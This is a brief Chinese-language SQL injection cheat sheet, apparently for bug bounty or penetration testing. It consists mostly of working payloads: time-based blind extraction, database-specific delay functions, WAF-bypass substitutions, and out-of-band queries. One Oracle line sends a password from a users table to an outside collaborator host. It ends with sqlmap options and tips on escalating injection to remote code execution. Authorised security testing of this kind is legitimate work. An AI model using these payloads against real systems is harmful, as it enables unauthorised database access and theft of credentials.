# SQL 注入

## 时间盲注方法论
1. 单引号确认注入点
2. 条件延迟逐位提取：
```sql
' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
```
3. 数据库特定延迟函数：
   - MySQL: `SLEEP(5)`, `BENCHMARK()`
   - MSSQL: `WAITFOR DELAY '00:00:05'`
   - PostgreSQL: `PG_SLEEP(5)`
   - Oracle: `dbms_pipe.receive_message(('a'),5)`

## WAF 绕过

### 无空格
```
%09(tab), %0A(LF), %0B, %0C, %0D, %A0
/**/ 替代空格
/*!12345UNION*//*!12345SELECT*/ 条件注释
```

### 无逗号
```sql
LIMIT 0,1 → LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) → SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3 → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```

### 无等号
```sql
= → LIKE, REGEXP, BETWEEN
> → NOT BETWEEN 0 AND X
WHERE → HAVING
```

## OOB 外带
```sql
MySQL: LOAD_FILE('\\BURP-COLLABORATOR\a')
MSSQL: exec master..xp_dirtree '//BURP-COLLABORATOR/a'
Oracle: UTL_HTTP.request('http://collaborator.com/'||(SELECT password FROM users WHERE rownum=1))
```

## 工具
- **sqlmap** — `--technique=T`（时间盲注）、`--tamper=space2comment`（WAF 绕过）
- **Interactsh** — 开源 OOB 收集器

## SRC 实战要点
- SQLi 链到 RCE = 严重漏洞（Yahoo 案例：SQLi → RCE → Root）
- 认证绕过 SQLi（无凭证登录）
- 二阶 SQLi（存储 payload 后续执行）
- OOB 外带要有实际数据证明
